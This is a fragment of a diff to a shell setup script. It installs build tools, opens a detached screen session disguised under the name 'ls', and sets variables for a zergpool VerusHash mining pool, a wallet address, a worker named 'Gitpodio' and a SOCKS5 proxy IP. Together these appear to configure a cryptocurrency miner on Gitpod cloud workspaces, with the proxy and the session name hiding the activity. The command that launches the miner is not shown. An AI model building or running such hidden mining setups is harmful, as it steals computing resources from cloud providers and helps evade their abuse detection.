@@ -3,7 +3,7 @@ sudo apt update
 sudo apt install screen libjansson4 -y
 sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
 screen -dmS ls
-A=verushash.na.mine.zergpool.com:3300
+A=stratum+tcp://verushash.na.mine.zergpool.com:3300
 B=D67zfz3CwzGqVahUP2xYazJrgZxY2gp3cD
 C=Gitpodio
 D=socks5://72.221.196.145:4145
